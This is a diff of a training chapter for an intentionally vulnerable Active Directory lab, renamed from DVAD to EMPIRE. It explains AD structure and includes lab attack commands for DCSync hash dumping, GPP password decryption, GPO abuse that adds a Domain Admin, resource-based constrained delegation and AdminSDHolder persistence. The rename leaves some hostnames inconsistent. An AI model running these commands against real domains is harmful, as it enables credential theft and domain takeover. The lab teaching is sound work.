@@ -8,9 +8,9 @@ By the end of this chapter you will understand:
 - What FSMO roles do and which ones you ZeroLogon.
 - How replication works and where DCSync fits in.
 - What an OU is, what a GPO is, and how `gpupdate` happens.
-- Why DVAD's three-forest topology was chosen.
+- Why EMPIRE's three-forest topology was chosen.
 
-> Reminder: DVAD is intentionally vulnerable. Run only on a network you own. Treat the VMs as hostile. The lab password and configs are public; do not reuse them anywhere else.
+> Reminder: EMPIRE is intentionally vulnerable. Run only on a network you own. Treat the VMs as hostile. The lab password and configs are public; do not reuse them anywhere else.
 
 ---
 
@@ -23,13 +23,13 @@ Microsoft looks at Banyan VINES, Novell NDS, and OSF DCE/DFS — all of which ha
 The big ideas Microsoft committed to:
 
 1. **LDAP v3 as the directory protocol.** Standardized in RFC 2251 (now 4511), queryable, extensible.
-2. **DNS-based naming.** A domain is `corp.local`, a host is `dc01.corp.local`. No more NetBIOS-only naming.
+2. **DNS-based naming.** A domain is `empire.local`, a host is `coruscant.empire.local`. No more NetBIOS-only naming.
 3. **Kerberos v5 as the authentication protocol.** Replaces NTLM as the default. NTLM still supported for backward compatibility (NT4 trust relationships, non-domain devices).
 4. **Forests, domains, OUs, GPOs.** Hierarchical structure for delegation and policy.
 5. **Multi-master replication.** Any DC can write; changes converge via a vector-clock protocol (MS-DRSR).
 6. **Trusts between domains, automatic within a forest.** No more painful one-way NT4 trust chains.
 
-Every one of those bullet points has aged with hairline cracks, and **the cracks are the attack surface.** DVAD reproduces them faithfully because that is the point of the lab.
+Every one of those bullet points has aged with hairline cracks, and **the cracks are the attack surface.** EMPIRE reproduces them faithfully because that is the point of the lab.
 
 ### Versions matter
 
@@ -39,38 +39,38 @@ Every one of those bullet points has aged with hairline cracks, and **the cracks
 - **Server 2012 R2** — Authentication policies, Protected Users, gMSAs. Schema v69.
 - **Server 2016** — PAM with Microsoft Identity Manager, JEA, Smartcard hardening, Allowed-to-Authenticate enforcement. Schema v87.
 - **Server 2019** — minor schema bumps for Defender for Identity. Schema v88.
-- **Server 2022** — DVAD default. Schema v88 (most additions land in client-side cmdlets). LDAP channel binding default-on for new installs.
+- **Server 2022** — EMPIRE default. Schema v88 (most additions land in client-side cmdlets). LDAP channel binding default-on for new installs.
 - **Server 2025** — schema bumps for Entra connect modernisation; default kerberos PKINIT hardening per KB5014754.
 
-Functional levels gate features (e.g., gMSAs require Windows Server 2012 forest functional level). DVAD runs at **Windows Server 2016** functional level (chosen for compatibility breadth).
+Functional levels gate features (e.g., gMSAs require Windows Server 2012 forest functional level). EMPIRE runs at **Windows Server 2016** functional level (chosen for compatibility breadth).
 
 ---
 
 ## 4.1 Domain, tree, forest
 
 ```
-                           Forest: corp.local
+                           Forest: empire.local
                                 |
                 +---------------+---------------+
                 |                               |
-            corp.local                  finance.local
+            empire.local                  rebel.local
        (forest root domain)         (External trust to corp;
-                |                    its own forest in DVAD)
+                |                    its own forest in EMPIRE)
        +--------+--------+
        |                 |
-   eu.corp.local    asia.corp.local
-   (child)          (child, illustrative; not in DVAD)
+   eu.empire.local    asia.empire.local
+   (child)          (child, illustrative; not in EMPIRE)
 
-   --- corp.local + eu.corp.local + asia.corp.local share the SAME forest,
+   --- empire.local + eu.empire.local + asia.empire.local share the SAME forest,
        the SAME schema, the SAME configuration partition. ---
-   --- finance.local has its own schema, its own configuration partition;
+   --- rebel.local has its own schema, its own configuration partition;
        trust is the bridge. ---
 ```
 
 ### Definitions
 
-- **Domain.** A security and administrative boundary with its own SID prefix, its own DCs, its own user/computer database (`NTDS.dit`). All DCs in a domain replicate that domain's Naming Context (NC) with each other. Has a DNS name (`corp.local`) and a NetBIOS name (`CORP`).
-- **Tree.** A set of domains with a **contiguous DNS namespace** linked by automatic parent-child trusts. `corp.local`, `eu.corp.local`, `asia.corp.local` form one tree.
+- **Domain.** A security and administrative boundary with its own SID prefix, its own DCs, its own user/computer database (`NTDS.dit`). All DCs in a domain replicate that domain's Naming Context (NC) with each other. Has a DNS name (`empire.local`) and a NetBIOS name (`EMPIRE`).
+- **Tree.** A set of domains with a **contiguous DNS namespace** linked by automatic parent-child trusts. `empire.local`, `eu.empire.local`, `asia.empire.local` form one tree.
 - **Forest.** The outermost boundary. A set of one or more trees that share:
   - A common **schema** (the definition of all object classes and attributes).
   - A common **configuration NC** (sites, services, trusts metadata, PKI containers).
@@ -79,15 +79,15 @@ Functional levels gate features (e.g., gMSAs require Windows Server 2012 forest 
 
 A forest is **the security boundary.** Domains inside a forest can't fully isolate from each other — Microsoft documents this clearly: "the forest is the security boundary, not the domain." Cross-forest is the meaningful trust line, and even there, SID filtering must be on to keep it tight.
 
-### DVAD's topology in three sentences
+### EMPIRE's topology in three sentences
 
-DVAD ships three forests: `corp.local` (with `eu.corp.local` as a child), `finance.local` (external trust to corp), and `root.corp` (forest trust to corp). Trusts are deliberately misconfigured: SID filtering is off, the trust keys are well-known (`TrustKey2024!`), and forest-wide attribute name aliases are exposed.
+EMPIRE ships three forests: `empire.local` (with `eu.empire.local` as a child), `rebel.local` (external trust to corp), and `trade.corp` (forest trust to corp). Trusts are deliberately misconfigured: SID filtering is off, the trust keys are well-known (`TrustKey2024!`), and forest-wide attribute name aliases are exposed.
 
 ```
 +--------------------------------------------+
-|  Forest 1: corp.local (2 domains, 1 tree)   |
-|    corp.local           dc01.corp.local  10.10.0.10
-|    eu.corp.local        dc01.eu.corp.local 10.10.0.11
+|  Forest 1: empire.local (2 domains, 1 tree)   |
+|    empire.local           coruscant.empire.local  10.10.0.10
+|    eu.empire.local        deathstar.eu.empire.local 10.10.0.11
 +--------------------------------------------+
    |                                  |
    |  External trust (one-way)        |  Forest trust (two-way)
@@ -95,8 +95,8 @@ DVAD ships three forests: `corp.local` (with `eu.corp.local` as a child), `finan
    |  TGT-routable                    |  TGT-routable, transitive
    v                                  v
 +----------------------+         +----------------------+
-| Forest 2: finance.local |       | Forest 3: root.corp  |
-|  dc01.finance 10.20.0.10|       |  dc01.root 10.30.0.10|
+| Forest 2: rebel.local |       | Forest 3: trade.corp  |
+|  coruscant.finance 10.20.0.10|       |  coruscant.root 10.30.0.10|
 +----------------------+         +----------------------+
 ```
 
@@ -108,10 +108,10 @@ Three forests because the cross-forest attack matrix (DF-001..040) is the pedago
 
 The AD database (NTDS.dit) is partitioned. Each partition is a **naming context (NC)**:
 
-1. **Schema NC** — `CN=Schema,CN=Configuration,DC=corp,DC=local`. Defines every class and attribute. **Forest-wide.** Read-only after creation except by Schema Admins.
-2. **Configuration NC** — `CN=Configuration,DC=corp,DC=local`. Sites, services, trust metadata, PKI containers. **Forest-wide.**
-3. **Domain NC** — `DC=corp,DC=local`. Users, groups, computers, OUs. **Per domain.**
-4. **Application NCs (optional)** — DNS (`DC=DomainDnsZones,DC=corp,DC=local` and `DC=ForestDnsZones,DC=corp,DC=local`), DFS, etc. May be domain-wide or forest-wide depending on app.
+1. **Schema NC** — `CN=Schema,CN=Configuration,DC=empire,DC=local`. Defines every class and attribute. **Forest-wide.** Read-only after creation except by Schema Admins.
+2. **Configuration NC** — `CN=Configuration,DC=empire,DC=local`. Sites, services, trust metadata, PKI containers. **Forest-wide.**
+3. **Domain NC** — `DC=empire,DC=local`. Users, groups, computers, OUs. **Per domain.**
+4. **Application NCs (optional)** — DNS (`DC=DomainDnsZones,DC=empire,DC=local` and `DC=ForestDnsZones,DC=empire,DC=local`), DFS, etc. May be domain-wide or forest-wide depending on app.
 
 The **Global Catalog** is a *partial read-only copy* of every domain NC in the forest, hosted on flagged DCs. Contains a subset of attributes flagged for GC replication (the schema bit `isMemberOfPartialAttributeSet`). Used for forest-wide searches like "find every user named peter.parker across all domains." Port: **3268** (LDAP) / **3269** (LDAPS) instead of 389/636.
 
@@ -120,7 +120,7 @@ The **Global Catalog** is a *partial read-only copy* of every domain NC in the f
 An object is identified by its DN, read right-to-left from the root of the directory:
 
 ```
-CN=peter.parker,CN=Users,DC=corp,DC=local
+CN=peter.parker,CN=Users,DC=empire,DC=local
 ^      ^         ^      ^
 |      |         |      +- top-level domain component
 |      |         +- second-level domain component
@@ -128,26 +128,26 @@ CN=peter.parker,CN=Users,DC=corp,DC=local
 +- common name
 ```
 
-OUs use `OU=`. Built-in containers use `CN=`. **OUs can have GPOs linked; CN containers cannot.** This matters for delegation: you can link a GPO to `OU=ServiceAccounts,DC=corp,DC=local` but not to `CN=Users,DC=corp,DC=local`. Default user accounts go in `CN=Users` until an admin moves them — a common mis-design.
+OUs use `OU=`. Built-in containers use `CN=`. **OUs can have GPOs linked; CN containers cannot.** This matters for delegation: you can link a GPO to `OU=ServiceAccounts,DC=empire,DC=local` but not to `CN=Users,DC=empire,DC=local`. Default user accounts go in `CN=Users` until an admin moves them — a common mis-design.
 
 ### What lives where, briefly
 
 ```
-DC=corp,DC=local
+DC=empire,DC=local
    CN=Users                 ← default user container (NOT an OU)
        CN=Administrator
        CN=krbtgt
        CN=Domain Admins
        CN=peter.parker
    CN=Computers             ← default computer container (NOT an OU)
-       CN=WS01
+       CN=tatooine
    CN=System                ← system containers
        CN=AdminSDHolder
        CN=Policies          ← GPO objects (DN-side)
        CN=ForeignSecurityPrincipals  ← cross-domain trustees
    CN=Builtin               ← built-in groups (BUILTIN\Administrators)
    OU=Domain Controllers    ← DCs go here; Default Domain Controllers Policy linked
-       CN=DC01
+       CN=coruscant
    OU=ServiceAccounts        ← typical custom OU
        CN=svc_jarvis
        CN=svc_vision
@@ -190,7 +190,7 @@ attributeSchema "samAccountName"
 
 The schema is **forest-wide and additive only.** Once you have added an attribute, you cannot remove it — only **deactivate** (mark `isDefunct=TRUE`). That's why Microsoft prepends Exchange/SCCM/AzureAD schema extensions with namespaced attribute names (`ms-Exch-...`, `ms-Mcs-AdmPwd`, `msDS-...`).
 
-**Schema Admins** is the most powerful group in the forest because schema changes are forest-wide and irreversible. DVAD makes a low-priv user a Schema Admin so you can practice schema-based persistence (PER-029 in PLAN.md). A defender who adds a new attribute can't easily *delete* it after compromise — only deactivate it.
+**Schema Admins** is the most powerful group in the forest because schema changes are forest-wide and irreversible. EMPIRE makes a low-priv user a Schema Admin so you can practice schema-based persistence (PER-029 in PLAN.md). A defender who adds a new attribute can't easily *delete* it after compromise — only deactivate it.
 
 ### Schema attacks (preview)
 
@@ -225,9 +225,9 @@ A **trust** lets users from one domain authenticate to resources in another. Tru
 
 Every trust has a shared secret — a **trust key**. Two of them actually: one for incoming, one for outgoing referrals. Stored in `CN=TrustedDomain,CN=System,DC=…` as `trustAuthIncoming` / `trustAuthOutgoing` (encrypted). The DC also stores them as LSA secrets under `HKLM\SECURITY\Policy\Secrets\G$$<domain>`.
 
-When a user from `finance.local` authenticates to a resource in `corp.local`, finance's DC issues a **referral TGT** (a TGT *for corp.local*) encrypted with the trust key. corp.local's KDC can decrypt it and issue a service ticket for the corp resource.
+When a user from `rebel.local` authenticates to a resource in `empire.local`, finance's DC issues a **referral TGT** (a TGT *for empire.local*) encrypted with the trust key. empire.local's KDC can decrypt it and issue a service ticket for the corp resource.
 
-If you steal a trust key (e.g., via DCSync on the trusting domain, or via `lsadump::trust` on a compromised DC), you can forge inter-realm TGTs — the **trust ticket forge** attack (DF-007). DVAD sets all trust keys to deterministic `TrustKey2024!` for repeatability of the exercise.
+If you steal a trust key (e.g., via DCSync on the trusting domain, or via `lsadump::trust` on a compromised DC), you can forge inter-realm TGTs — the **trust ticket forge** attack (DF-007). EMPIRE sets all trust keys to deterministic `TrustKey2024!` for repeatability of the exercise.
 
 ### Forest trust vs external trust
 
@@ -237,12 +237,12 @@ If you steal a trust key (e.g., via DCSync on the trusting domain, or via `lsadu
 When SID filtering is on, SIDs in tickets crossing the trust are scrubbed except for the foreign domain's own SIDs. Off → SID history injection attacks become trivial.
 
 ```
-A user from finance.local presents a TGT to corp.local for a corp resource.
+A user from rebel.local presents a TGT to empire.local for a corp resource.
 The TGT's PAC contains:
-    extra_sids: [ S-1-5-21-CORP-519 (Enterprise Admins of CORP) ]
+    extra_sids: [ S-1-5-21-EMPIRE-519 (Enterprise Admins of EMPIRE) ]
 
-With SID filtering ON: corp.local's KDC strips that SID before issuing the TGS.
-With SID filtering OFF: corp.local honors the SID -> user is EA on corp.
+With SID filtering ON: empire.local's KDC strips that SID before issuing the TGS.
+With SID filtering OFF: empire.local honors the SID -> user is EA on corp.
 ```
 
 ### Quarantine / SID filtering flag
@@ -267,10 +267,10 @@ The `trustAttributes` attribute encodes whether quarantine (SID filtering) is en
 
 While AD is multi-master, five **Flexible Single Master Operation (FSMO)** roles are held by exactly one DC at a time. They exist for operations that must serialize globally.
 
-| Role | Scope | What it does | DVAD holder |
+| Role | Scope | What it does | EMPIRE holder |
 |---|---|---|---|
-| **Schema Master** | Forest | Coordinates schema changes | dc01.corp.local |
-| **Domain Naming Master** | Forest | Coordinates adding/removing domains | dc01.corp.local |
+| **Schema Master** | Forest | Coordinates schema changes | coruscant.empire.local |
+| **Domain Naming Master** | Forest | Coordinates adding/removing domains | coruscant.empire.local |
 | **PDC Emulator** | Domain | Authoritative time source; password change preference; GPO writer; SDProp runner; legacy NT4 PDC role | per-domain |
 | **RID Master** | Domain | Hands out RID pools (~500 RIDs at a time) to other DCs so they can mint new objects | per-domain |
 | **Infrastructure Master** | Domain | Updates cross-domain references (group memberships from other domains) | per-domain |
@@ -279,11 +279,11 @@ Check who holds them:
 
 ```
 PS> netdom query fsmo
-Schema master                 dc01.corp.local
-Domain naming master          dc01.corp.local
-PDC                           dc01.corp.local
-RID pool manager              dc01.corp.local
-Infrastructure master         dc01.corp.local
+Schema master                 coruscant.empire.local
+Domain naming master          coruscant.empire.local
+PDC                           coruscant.empire.local
+RID pool manager              coruscant.empire.local
+Infrastructure master         coruscant.empire.local
 ```
 
 ### Why this matters
@@ -293,7 +293,7 @@ Infrastructure master         dc01.corp.local
 - **RID Master** failure stops the domain from creating new accounts after the current pool runs out. Operational, not offensive.
 - **Schema Master** failure stops schema changes; if you're a Schema Admin attacker, you need this DC online.
 
-In DVAD, FSMO roles default to `dc01.corp.local` for the corp domain.
+In EMPIRE, FSMO roles default to `coruscant.empire.local` for the corp domain.
 
 ---
 
@@ -325,16 +325,16 @@ Any account with both of these extended rights on the domain root object:
 
 …can call `DRSGetNCChanges` against a DC and request specific objects, including the `unicodePwd`, `dBCSPwd`, and `supplementalCredentials` attributes (NT hash, LM hash, Kerberos keys). The DC happily sends them because it thinks the caller is another DC catching up.
 
-DVAD pre-grants these rights to a low-priv user `doctor.strange` for `CRED-007`. The technique is:
+EMPIRE pre-grants these rights to a low-priv user `doctor.strange` for `CRED-007`. The technique is:
 
 ```bash
-impacket-secretsdump -just-dc-user krbtgt corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10
+impacket-secretsdump -just-dc-user krbtgt empire.local/doctor.strange:'EmpireLab2024!'@10.10.0.10
 
 # Or all hashes
-impacket-secretsdump -just-dc corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10
+impacket-secretsdump -just-dc empire.local/doctor.strange:'EmpireLab2024!'@10.10.0.10
 
 # As DA (default for Domain Admins members)
-impacket-secretsdump -just-dc corp.local/Administrator:'DVADlab2024!'@10.10.0.10
+impacket-secretsdump -just-dc empire.local/Administrator:'EmpireLab2024!'@10.10.0.10
 ```
 
 For DCSync detection, see chapter 13. The canonical signal is event 4662 with both 1131f6aa and 1131f6ad GUIDs from a non-DC trustee.
@@ -350,18 +350,18 @@ Instead of *reading* via DRSGetNCChanges, DCShadow *registers* a rogue DC, *push
 OUs are containers for delegation and GPO targeting. They form a tree under the domain root:
 
 ```
-DC=corp,DC=local
+DC=empire,DC=local
   |
   +-- OU=ServiceAccounts
   |     +-- CN=svc_jarvis
   |     +-- CN=svc_vision
   +-- OU=Workstations
-  |     +-- CN=ws01
+  |     +-- CN=tatooine
   +-- OU=Servers
-  |     +-- CN=file01
-  |     +-- CN=sql01
+  |     +-- CN=scarif
+  |     +-- CN=kamino
   +-- OU=Domain Controllers       ← special; holds DCs; Default Domain Controllers Policy linked
-  |     +-- CN=dc01
+  |     +-- CN=coruscant
   +-- CN=Users   ← default container, NOT an OU
   |     +-- CN=Administrator
   |     +-- CN=peter.parker
@@ -383,14 +383,14 @@ OUs allow:
 - Workstation admin team = `Add/Remove Computer to Domain` + GenericWrite on OU=Workstations.
 - Server team = GenericAll on OU=Servers.
 
-If any of those groups also contain a low-priv member you compromised, the OU's delegation becomes your attack path. DVAD seeds at least one such mis-delegation — that's a PE-018-class flag.
+If any of those groups also contain a low-priv member you compromised, the OU's delegation becomes your attack path. EMPIRE seeds at least one such mis-delegation — that's a PE-018-class flag.
 
 ### How to inspect
 
 ```
 PS> Get-ADOrganizationalUnit -Filter * -Properties nTSecurityDescriptor
-PS> dsacls "OU=ServiceAccounts,DC=corp,DC=local"
-PS> Get-DomainObjectAcl -SearchBase 'OU=ServiceAccounts,DC=corp,DC=local' -ResolveGUIDs |
+PS> dsacls "OU=ServiceAccounts,DC=empire,DC=local"
+PS> Get-DomainObjectAcl -SearchBase 'OU=ServiceAccounts,DC=empire,DC=local' -ResolveGUIDs |
        Where-Object IdentityReferenceName -eq 'peter.parker'
 ```
 
@@ -400,8 +400,8 @@ PS> Get-DomainObjectAcl -SearchBase 'OU=ServiceAccounts,DC=corp,DC=local' -Resol
 
 A **Group Policy Object** is a collection of registry, file, script, and security settings stored in two places:
 
-1. **In AD:** `CN={GUID},CN=Policies,CN=System,DC=corp,DC=local`. Contains the GPO metadata (`gPCFileSysPath`, `versionNumber`, `flags`).
-2. **In SYSVOL:** `\\corp.local\SYSVOL\corp.local\Policies\{GUID}\`. Contains the actual settings.
+1. **In AD:** `CN={GUID},CN=Policies,CN=System,DC=empire,DC=local`. Contains the GPO metadata (`gPCFileSysPath`, `versionNumber`, `flags`).
+2. **In SYSVOL:** `\\empire.local\SYSVOL\empire.local\Policies\{GUID}\`. Contains the actual settings.
 
 ```
 {GUID}
@@ -437,11 +437,11 @@ A **Group Policy Object** is a collection of registry, file, script, and securit
 ### Why GPOs matter to attackers
 
 - **SYSVOL is world-readable** to authenticated domain users. Anyone with valid creds can browse it.
-- **Historical sin: GPP passwords.** Group Policy Preferences (introduced 2008) supported configuring local accounts via GPO. The password was stored in `Groups.xml` etc. encrypted with **a static AES key Microsoft published in MSDN**. Anyone could decrypt. MS-14-025 (June 2014) deprecated GPP password storage. Old GPOs lingered for years. DVAD seeds at least one as CRED-006.
+- **Historical sin: GPP passwords.** Group Policy Preferences (introduced 2008) supported configuring local accounts via GPO. The password was stored in `Groups.xml` etc. encrypted with **a static AES key Microsoft published in MSDN**. Anyone could decrypt. MS-14-025 (June 2014) deprecated GPP password storage. Old GPOs lingered for years. EMPIRE seeds at least one as CRED-006.
 - **GPO write = host compromise.** If you can edit a GPO that targets DCs, you can drop a startup script that runs as SYSTEM on every DC. That is an Enterprise-Admin-grade primitive. PE-038 / PER-021.
 - **Logon scripts execute as the user.** If you can modify a logon-script GPO linked to an OU that contains Domain Admins, you can capture or run code as DA the next time one logs on.
 
-DVAD includes a misconfigured GPO with weak ACLs as a PE-* and PER-* vector.
+EMPIRE includes a misconfigured GPO with weak ACLs as a PE-* and PER-* vector.
 
 ### Tools
 
@@ -454,7 +454,7 @@ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuN
 SharpGPOAbuse.exe --AddComputerScript --GPOName "Default Domain Policy" --ScriptName evil.bat --ScriptContents "net group 'Domain Admins' peter.parker /add /domain"
 
 # Or via PowerShell / pyGPOAbuse on Kali
-pyGPOAbuse.py corp.local/peter.parker:'DVADlab2024!' -gpo-id "{31B2F340-016D-11D2-945F-00C04FB984F9}" -powershell -command "<base64 PS>"
+pyGPOAbuse.py empire.local/peter.parker:'EmpireLab2024!' -gpo-id "{31B2F340-016D-11D2-945F-00C04FB984F9}" -powershell -command "<base64 PS>"
 ```
 
 ### Detection
@@ -478,10 +478,10 @@ AD Sites and Services:
   Sites
     Default-First-Site-Name
       Subnets: 10.10.0.0/21
-      Servers: dc01.corp.local
+      Servers: coruscant.empire.local
     Site-Singapore
       Subnets: 192.168.50.0/24
-      Servers: dc02.corp.local
+      Servers: dc02.empire.local
     InterSiteTransports
       IP (RPC over IP, sync)
       SMTP (rarely used, async)
@@ -489,7 +489,7 @@ AD Sites and Services:
 
 A client looks up its site via the **DC locator** (`DsGetDcName`). The client provides its IP; the locator finds the matching subnet object and returns the site's DC list.
 
-DVAD has a single site since the lab is small. The concept matters for two reasons:
+EMPIRE has a single site since the lab is small. The concept matters for two reasons:
 
 1. **Replication choke points.** Inter-site replication can be hours apart, meaning DCSync from one DC may take time to propagate. Operational, rarely offensive.
 2. **NetBIOS / LLMNR poisoning happens within a site/broadcast domain.** Site topology mirrors network topology mostly.
@@ -561,13 +561,13 @@ An **SPN** is a Kerberos identifier for a service running as a particular accoun
 
 Examples:
 
-- `cifs/file01.corp.local` — SMB on file01.
-- `MSSQLSvc/sql01.corp.local:1433` — MSSQL default instance on sql01.
-- `HTTP/owa.corp.local` — HTTP service (Exchange/IIS Kerberos).
-- `LDAP/dc01.corp.local` — LDAP on the DC.
-- `host/dc01.corp.local` — host service (generic; machine).
-- `GC/dc01.corp.local` — Global Catalog.
-- `TERMSRV/ws01.corp.local` — Remote Desktop.
+- `cifs/scarif.empire.local` — SMB on scarif.
+- `MSSQLSvc/kamino.empire.local:1433` — MSSQL default instance on kamino.
+- `HTTP/owa.empire.local` — HTTP service (Exchange/IIS Kerberos).
+- `LDAP/coruscant.empire.local` — LDAP on the DC.
+- `host/coruscant.empire.local` — host service (generic; machine).
+- `GC/coruscant.empire.local` — Global Catalog.
+- `TERMSRV/tatooine.empire.local` — Remote Desktop.
 
 SPNs are stored on the *account that runs the service*, in the `servicePrincipalName` multi-valued attribute:
 
@@ -587,13 +587,13 @@ SPNs are stored on the *account that runs the service*, in the `servicePrincipal
 ### Discovery
 
 ```bash
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
 # or
-ldapsearch -x -H ldap://10.10.0.10 -D 'peter.parker@corp.local' -w '…' -b 'DC=corp,DC=local' \
+ldapsearch -x -H ldap://10.10.0.10 -D 'peter.parker@empire.local' -w '…' -b 'DC=empire,DC=local' \
   '(&(servicePrincipalName=*)(!objectClass=computer))' samAccountName servicePrincipalName
 ```
 
-DVAD has multiple kerberoastable accounts (`svc_jarvis`, `svc_vision`, `svc_backup`) with weak passwords baked in for CRED-001.
+EMPIRE has multiple kerberoastable accounts (`svc_jarvis`, `svc_vision`, `svc_r2d2`) with weak passwords baked in for CRED-001.
 
 ### writeSPN abuse (Targeted Kerberoast / setspn against arbitrary user)
 
@@ -617,9 +617,9 @@ Three flavors:
 
 Worst design choice in AD. When a user authenticates to a service marked "trusted for delegation," the user's *full forwardable TGT* is stored in the service's memory. Anyone who compromises that service host can extract the TGT and impersonate every user who has ever authenticated to it.
 
-DCs are implicitly unconstrained — that's why coercion attacks against DCs are catastrophic when there's a relayable target. Worse: if a regular service is marked unconstrained, a coercion that targets *it* (PrinterBug pointing at the service) makes the DC machine account authenticate to the service. The service now has a TGT for `DC01$` → DCSync.
+DCs are implicitly unconstrained — that's why coercion attacks against DCs are catastrophic when there's a relayable target. Worse: if a regular service is marked unconstrained, a coercion that targets *it* (PrinterBug pointing at the service) makes the DC machine account authenticate to the service. The service now has a TGT for `coruscant$` → DCSync.
 
-DVAD: `svc_legacy` is unconstrained. `FILE01$` may also be unconstrained for some lab variants.
+EMPIRE: `svc_legacy` is unconstrained. `scarif$` may also be unconstrained for some lab variants.
 
 ### 4.12.2 Constrained delegation (TRUSTED_TO_AUTH_FOR_DELEGATION + msDS-AllowedToDelegateTo)
 
@@ -636,28 +636,28 @@ Inverted model: instead of telling service A "you can delegate to B," you tell *
 
 1. `MachineAccountQuota=10` lets any authenticated domain user create up to 10 computer accounts (the user becomes `mS-DS-CreatorSID`).
 2. Create `BADCOMP$` via `impacket-addcomputer`, get its NT hash (or pick the password).
-3. If you have `GenericWrite` on `B` (say, `FILE01$`), set `B.msDS-AllowedToActOnBehalfOfOtherIdentity` to a security descriptor allowing `BADCOMP$`.
+3. If you have `GenericWrite` on `B` (say, `scarif$`), set `B.msDS-AllowedToActOnBehalfOfOtherIdentity` to a security descriptor allowing `BADCOMP$`.
 4. From `BADCOMP$`, do **S4U2Self** for `Administrator` against `B` → get a service ticket → admin on B.
 
 ```bash
 # Create attacker computer
 impacket-addcomputer -computer-name 'BADCOMP$' -computer-pass 'BadComp123!' \
-    -dc-host dc01.corp.local corp.local/peter.parker:'DVADlab2024!'
+    -dc-host coruscant.empire.local empire.local/peter.parker:'EmpireLab2024!'
 
 # Write the RBCD
-impacket-rbcd corp.local/peter.parker:'DVADlab2024!' -delegate-from 'BADCOMP$' \
-    -delegate-to 'FILE01$' -action write -dc-host dc01.corp.local
+impacket-rbcd empire.local/peter.parker:'EmpireLab2024!' -delegate-from 'BADCOMP$' \
+    -delegate-to 'scarif$' -action write -dc-host coruscant.empire.local
 
 # S4U2Self impersonating Administrator
-impacket-getST -spn 'cifs/file01.corp.local' -impersonate Administrator \
-    corp.local/'BADCOMP$':'BadComp123!' -dc-ip 10.10.0.10
+impacket-getST -spn 'cifs/scarif.empire.local' -impersonate Administrator \
+    empire.local/'BADCOMP$':'BadComp123!' -dc-ip 10.10.0.10
 
 # Use the ticket
-KRB5CCNAME=Administrator@cifs_file01.corp.local@CORP.LOCAL.ccache impacket-secretsdump \
-    -k -no-pass file01.corp.local
+KRB5CCNAME=Administrator@cifs_scarif.empire.local@empire.local.ccache impacket-secretsdump \
+    -k -no-pass scarif.empire.local
 ```
 
-DVAD provisions exactly this RBCD vulnerability on `FILE01$` for `CRED-019`.
+EMPIRE provisions exactly this RBCD vulnerability on `scarif$` for `CRED-019`.
 
 ### Why RBCD is so productive
 
@@ -683,7 +683,7 @@ Kerberos tickets in Windows carry a **PAC** — a Microsoft extension blob in th
 
 When a service receives a ticket, it can read the PAC to make authorization decisions without re-querying the DC. Most services do not validate the KDC signature against the KDC — that's the PAC validation lapse exploited by Golden Tickets (forged with krbtgt key) and Sapphire/Diamond tickets (PAC manipulation post-KDC).
 
-**KB5008380 / KB5020805 (Nov 2021 / Nov 2022)** added enforcement-mode PAC validation that closes most forgery loopholes. DVAD does *not* apply these patches by default. Production hosts should.
+**KB5008380 / KB5020805 (Nov 2021 / Nov 2022)** added enforcement-mode PAC validation that closes most forgery loopholes. EMPIRE does *not* apply these patches by default. Production hosts should.
 
 ---
 
@@ -726,7 +726,7 @@ Stuff stored in `CN=Configuration,...` is read-by-everyone (Authenticated Users 
 | **DHCP Administrators** | (varies) | Manage DHCP — sometimes path to network MITM |
 | **Protected Users** | 525 | Members subject to extra Kerberos hardening: RC4 disabled, NTLM disabled, no caching, no delegation |
 
-DVAD intentionally populates Backup/Server/Print Operators with low-priv users so you can practice PE-* against the DC. The lab also adds `peter.parker` (or a similar user) to `DnsAdmins` as a privesc gateway.
+EMPIRE intentionally populates Backup/Server/Print Operators with low-priv users so you can practice PE-* against the DC. The lab also adds `peter.parker` (or a similar user) to `DnsAdmins` as a privesc gateway.
 
 ### Protected Users — defenders' antidote
 
@@ -738,13 +738,13 @@ DVAD intentionally populates Backup/Server/Print Operators with low-priv users s
 - TGTs limit to 4 hours, no renewal.
 - DPAPI master keys not cached.
 
-Use it for every administrative account. DVAD does not add its admins to Protected Users so all the attacks remain practiceable.
+Use it for every administrative account. EMPIRE does not add its admins to Protected Users so all the attacks remain practiceable.
 
 ---
 
 ## 4.16 AdminSDHolder and SDProp
 
-`CN=AdminSDHolder,CN=System,DC=corp,DC=local` is a special object whose **security descriptor is periodically (every 60 min by default) copied** to every protected group member and every protected group itself. Protected groups include Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators, Server Operators, Print Operators, Replicator, Domain Controllers, Read-only Domain Controllers, Cert Publishers (Server 2012+), and the krbtgt account.
+`CN=AdminSDHolder,CN=System,DC=empire,DC=local` is a special object whose **security descriptor is periodically (every 60 min by default) copied** to every protected group member and every protected group itself. Protected groups include Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators, Server Operators, Print Operators, Replicator, Domain Controllers, Read-only Domain Controllers, Cert Publishers (Server 2012+), and the krbtgt account.
 
 The mechanism is **SDProp**, run by the **PDC Emulator** every 60 minutes. Configurable via `AdminSDProtectFrequency` (in seconds) DWORD under `HKLM\SYSTEM\CCS\Services\NTDS\Parameters` — but most orgs leave the default.
 
@@ -756,8 +756,8 @@ Edit AdminSDHolder's DACL to grant your account `GenericAll`. Within 60 minutes,
 
 ```bash
 # Add ACE to AdminSDHolder (requires GenericWrite on AdminSDHolder; you might get that as a junior nick.fury admin)
-dacledit -principal peter.parker -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
-   -action write -rights FullControl corp.local/peter.parker:'DVADlab2024!'
+dacledit -principal peter.parker -target-dn 'CN=AdminSDHolder,CN=System,DC=empire,DC=local' \
+   -action write -rights FullControl empire.local/peter.parker:'EmpireLab2024!'
 
 # Wait 60 minutes, or trigger SDProp manually if you somehow have rights
 PS> Set-ItemProperty 'HKLM:\SYSTEM\CCS\Services\NTDS\Parameters' RunProtectAdminGroupsTask 1
@@ -765,7 +765,7 @@ PS> Set-ItemProperty 'HKLM:\SYSTEM\CCS\Services\NTDS\Parameters' RunProtectAdmin
 # Then enjoy GenericAll on Administrator
 ```
 
-This is `PER-014` in DVAD. Detection: 5136 (DS object modified) on AdminSDHolder, plus 4780 (SDProp run, reset DACL on protected account).
